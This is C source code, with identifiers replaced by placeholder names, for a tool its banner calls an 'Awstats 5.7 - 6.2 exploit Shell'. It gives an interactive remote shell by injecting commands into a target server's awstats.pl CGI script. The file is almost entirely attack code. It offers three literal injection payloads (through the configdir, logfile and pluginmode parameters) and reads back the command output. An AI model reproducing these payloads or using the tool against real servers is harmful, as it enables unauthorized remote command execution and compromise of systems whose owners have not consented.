
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct in_addr {int dummy; } ;
struct sockaddr_in {struct in_addr sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {char* h_name; scalar_t__ h_addr; } ;
typedef int FILE ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 char* VAR_3 ;
 char* VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int FUNC_0 (int) ;
 scalar_t__ FUNC_1 (int,struct sockaddr*,int) ;
 int FUNC_2 (int) ;
 int FUNC_3 (int *) ;
 int * FUNC_4 (int,char*) ;
 int FUNC_5 (char*,int,int ) ;
 int FUNC_6 (int *,char*,char*,char*,char*,char*,...) ;
 int FUNC_7 () ;
 struct hostent* FUNC_8 (char*) ;
 char FUNC_9 (int,char**,char*) ;
 int FUNC_10 (int ) ;
 char* FUNC_11 (struct in_addr) ;
 int FUNC_12 (char*,int ,int) ;
 char* VAR_8 ;
 int VAR_9 ;
 int FUNC_13 (char*,...) ;
 int FUNC_14 (char) ;
 int FUNC_15 (int,char*,int) ;
 int FUNC_16 (int *,int *) ;
 int FUNC_17 (int,int ) ;
 int FUNC_18 (int ,int ,int ) ;
 int VAR_10 ;
 scalar_t__ FUNC_19 (char*,char*) ;
 int FUNC_20 (char*) ;
 int * FUNC_21 (char*,char*) ;
 int FUNC_22 (char**) ;

int FUNC_23(int VAR_11, char *VAR_12[]){

 FILE *VAR_13;
 int VAR_14;
 struct sockaddr_in VAR_15;
 struct hostent *VAR_16;
 char *VAR_17=((void*)0), *VAR_18=((void*)0);
 char VAR_19[VAR_1], VAR_20[VAR_1*3], VAR_21[VAR_2], VAR_22, VAR_23, VAR_24;
 int VAR_25, VAR_26, VAR_27, VAR_28, VAR_29=0;


 if(VAR_11 < 2){
  FUNC_22(VAR_12);
 }

 FUNC_13("Awstats 5.7 - 6.2 exploit Shell 0.1\n");
 FUNC_13("code by omin0us\n");
 FUNC_13("dtors security group\n");
 FUNC_13(".: http://dtors.ath.cx :.\n");
    FUNC_13("--------------------------------------\n");

 while(1){
  VAR_24 = FUNC_9(VAR_11, VAR_12, "h:d:v");

  if(VAR_24 < 0)
   break;

  switch(VAR_24){
   case 'v':
    VAR_29 = 1;
    break;
   case 'd':
    VAR_18 = VAR_8;
    break;
  }
 }

 if((VAR_9 >= VAR_11) || (FUNC_19(VAR_12[VAR_9], "-") == 0)){
  FUNC_13("Please specify a Host\n");
  FUNC_22(VAR_12);
 }

 if(!VAR_18){
  VAR_18 = "/cgi-bin/awstats.pl";
 }

 FUNC_13("select exploit method:\n"
        "\t1. ?configdir=|cmd}\n"
        "\t2. ?update=1&logfile=|cmd|\n"
        "\t3. ?pluginmode=:system(\"cmd\");\n");
 while(VAR_28 != '1' && VAR_28 != '2' && VAR_28 != '3'){
  FUNC_13("\nmethod [1/2/3]? ");
  VAR_28 = FUNC_7();
 }

 FUNC_13("starting shell...\n(ctrl+c to exit)\n");


while(1){
 VAR_25=0;
 VAR_26=0;
 FUNC_12(VAR_19, 0, VAR_1);
 FUNC_12(VAR_20, 0, VAR_1*3);
 FUNC_12(VAR_21, 0, VAR_2);

 if((VAR_14 = FUNC_18(VAR_0, VAR_7, 0)) < 0){
  FUNC_13("Error creating socket\n");
  FUNC_2(1);
 }

 if((VAR_16 = FUNC_8(VAR_12[VAR_9])) == ((void*)0)){
  FUNC_13("Could not resolv host\n");
  FUNC_2(1);
 }

 VAR_15.sin_family = VAR_0;
 VAR_15.sin_port = FUNC_10(VAR_5);
 VAR_15.sin_addr = *((struct in_addr *)VAR_16->h_addr);

 FUNC_13("sh3ll> ");
 FUNC_5(VAR_19, VAR_1-1, VAR_10);

 if(VAR_29)
  FUNC_13("Connecting to %s (%s)...\n", VAR_16->h_name, FUNC_11(*((struct in_addr *)VAR_16->h_addr)));

 if( FUNC_1(VAR_14, (struct sockaddr *)&VAR_15, sizeof(struct sockaddr_in)) != 0){
  FUNC_13("Count not connect to host\n");
  FUNC_2(1);
 }

 VAR_13 = FUNC_4(VAR_14, "a");
 FUNC_16(VAR_13, ((void*)0));

 VAR_19[FUNC_20(VAR_19)-1] = '\0';
 if(FUNC_20(VAR_19) == 0){
  VAR_19[0]='i';
  VAR_19[1]='d';
  VAR_19[3]='\0';
 }

 for(VAR_25=0; VAR_25<FUNC_20(VAR_19); VAR_25++){
  VAR_23 = VAR_19[VAR_25];
  if(VAR_23 == ' '){
   VAR_20[VAR_26++] = '%';
   VAR_20[VAR_26++] = '2';
   VAR_20[VAR_26++] = '0';
  }
  else{
   VAR_20[VAR_26++] = VAR_23;
  }
 }
 VAR_20[VAR_26] = '\0';

 if(VAR_28 == '1'){
  if(VAR_29){
   FUNC_13("Sending Request\n");
   FUNC_13("GET %s?configdir=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\n\n", VAR_18, VAR_3, VAR_20, VAR_4);
  }

  FUNC_6(VAR_13, "GET %s?configdir=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\n\n", VAR_18, VAR_3, VAR_20, VAR_4);
 }

 if(VAR_28 == '2'){
  if(VAR_29){
   FUNC_13("Sending Request\n");
   FUNC_13("GET %s?update=1&logfile=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\n\n", VAR_18, VAR_3, VAR_20, VAR_4);
  }
  FUNC_6(VAR_13, "GET %s?update=1&logfile=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\n\n", VAR_18, VAR_3, VAR_20, VAR_4);
 }

 if(VAR_28 == '3'){
  if(VAR_29){
   FUNC_13("Sending Request\n");
   FUNC_13("GET %s?pluginmode=:system(\"echo+%s;%s;echo+%s\"); HTTP/1.0\n"
"Connection: Keep-Alive\n"
"Host: %s\n\n", VAR_18, VAR_3, VAR_20, VAR_4, VAR_12[VAR_9]);
  }
  FUNC_6(VAR_13, "GET %s?pluginmode=:system(\"echo+%s;%s;echo+%s\"); HTTP/1.0\n"
"Connection: Keep-Alive\n"
"Host: %s\n\n", VAR_18, VAR_3, VAR_20, VAR_4, VAR_12[VAR_9]);
 }


 VAR_25=0;
 while(FUNC_21(VAR_21, VAR_3) == ((void*)0)){
  VAR_27 = FUNC_15(VAR_14, &VAR_22, 1);
  VAR_21[VAR_25++] = VAR_22;

  if(VAR_25 >= VAR_2){
   FUNC_13("flag [-] incoming buffer full\n");
   FUNC_2(1);
  }
  if(VAR_27==0){
   FUNC_13("exploitation of host failed\n");
   FUNC_2(1);
  }
 }

 while(FUNC_21(VAR_21, VAR_4) == ((void*)0)){
  FUNC_15(VAR_14,&VAR_22,1);
  VAR_21[VAR_25++] = VAR_22;
  FUNC_14(VAR_22);
  if(VAR_25 >= VAR_2){
   FUNC_13("putchar [-] incoming buffer full\n");
   FUNC_2(1);
  }
 }
 FUNC_13("\n");

 FUNC_17(VAR_14, VAR_6);
 FUNC_0(VAR_14);
 FUNC_3(VAR_13);
 }
 return(0);
}
